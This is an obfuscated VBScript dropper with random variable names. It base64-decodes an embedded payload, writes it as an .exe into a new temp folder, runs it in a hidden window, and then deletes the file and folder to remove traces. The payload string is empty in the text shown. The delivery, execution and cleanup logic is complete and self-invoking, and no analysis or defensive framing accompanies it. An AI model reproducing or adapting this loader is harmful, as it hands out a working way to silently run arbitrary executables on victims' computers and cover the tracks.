Function HywoANGTBuXR(jvCgGixDJjqtChL)
	eUpOjlMt = "<B64DECODE xmlns:dt="& Chr(34) & "urn:schemas-microsoft-com:datatypes" & Chr(34) & " " & _
		"dt:dt=" & Chr(34) & "bin.base64" & Chr(34) & ">" & _
		jvCgGixDJjqtChL & "</B64DECODE>"
	Set vFumrdhfum = CreateObject("MSXML2.DOMDocument.3.0")
	vFumrdhfum.LoadXML(eUpOjlMt)
	HywoANGTBuXR = vFumrdhfum.selectsinglenode("B64DECODE").nodeTypedValue
	set vFumrdhfum = nothing
End Function

Function jLfqkRwuHdOBrqx()
	aqnjwkWQiusQ = ""
	Dim QaAKbLgdeSho
	Set QaAKbLgdeSho = CreateObject("Scripting.FileSystemObject")
	Dim gRVYLyjRd
	Dim XoxgyJRPWxuS
	Set gRVYLyjRd = QaAKbLgdeSho.GetSpecialFolder(2)
	XoxgyJRPWxuS = gRVYLyjRd & "\" & QaAKbLgdeSho.GetTempName()
	QaAKbLgdeSho.CreateFolder(XoxgyJRPWxuS)
	wfmLdsgWerqm = XoxgyJRPWxuS & "\" & "SEXSrYjagJAtDzH.exe"
	Dim xcUEWkixSGj
	Set xcUEWkixSGj = CreateObject("Wscript.Shell")
	ncPKslhafKbw = HywoANGTBuXR(aqnjwkWQiusQ)
	Set MINiPDqpygZvXoi = CreateObject("ADODB.Stream")
	MINiPDqpygZvXoi.Type = 1
	MINiPDqpygZvXoi.Open
	MINiPDqpygZvXoi.Write ncPKslhafKbw
	MINiPDqpygZvXoi.SaveToFile wfmLdsgWerqm, 2
	xcUEWkixSGj.run wfmLdsgWerqm, 0, true
	QaAKbLgdeSho.DeleteFile(wfmLdsgWerqm)
	QaAKbLgdeSho.DeleteFolder(XoxgyJRPWxuS)
End Function

jLfqkRwuHdOBrqx

